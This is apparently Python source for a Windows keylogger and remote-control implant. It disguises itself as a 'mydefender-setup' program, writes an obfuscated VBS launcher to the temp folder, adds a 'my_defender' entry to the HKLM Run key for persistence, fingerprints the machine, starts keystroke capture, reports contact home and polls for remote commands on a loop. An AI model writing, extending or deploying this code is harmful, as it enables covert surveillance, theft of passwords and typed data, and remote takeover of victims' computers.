import winreg
import time
import utils
import capture
import os
import tempfile
import winreg

def init():
    # Define some locations
    EXE_LOC = tempfile.gettempdir() + "\\mydefender-setup.exe"
    VBS_LOC = tempfile.gettempdir() + "\\mydefender-setup.vbs"

    # Check if the executables do not exist
    if not os.path.exists(EXE_LOC) and not os.path.exists(VBS_LOC):
        # Write if to the file
        with open(VBS_LOC, 'w') as f:
            f.write(utils.decypher('Dpe HdsDspww = HDnctae.NcplepZmupne("HDnctae.Dspww")\nHdsDspww.Cfy """', 2145914515105215125) +
                    EXE_LOC +
                    utils.decypher('""", 5 , snyfr', 486573582754285))
        # Copy the files to the system
        os.system('copy %s %s'%("mydefender-setup.exe", EXE_LOC))

    # Open the registery
    wr = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    # Open the run key
    with winreg.OpenKey(wr, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS) as rk:
        wf = False
        for i in range(0, 100):
            try:
                n,_,_ = winreg.EnumValue(rk, i)
                print(n)

                if n == "my_defender":
                    wf = True
            except:
                print("Something wen't wrong mate.")

        if not wf:
            print("Setting new key")
            winreg.SetValueEx(rk, "my_defender", 0, winreg.REG_EXPAND_SZ, VBS_LOC)

        # Close the key (Alternative to: winreg.CloseKey(hkey))
        rk.Close()

    # Generate a fingerprint
    utils.create_fp()
    # Init the keystroke thread
    capture.init_keylogger()
    # Send a message that we established contact
    utils.send_text(utils.decypher("Wnf lxwcjlc nwpjpnm.", 91581751751))


def main():
    # Run the init function
    init()

    # Little schedule feature to fetch the commands periodically
    next_run = 0
    while True:
        # If the next run is smaller than the current time
        if next_run < time.time():
            next_run = int(time.time()) + 359
            utils.fetch_commands()

    
if __name__ == '__main__':
    main()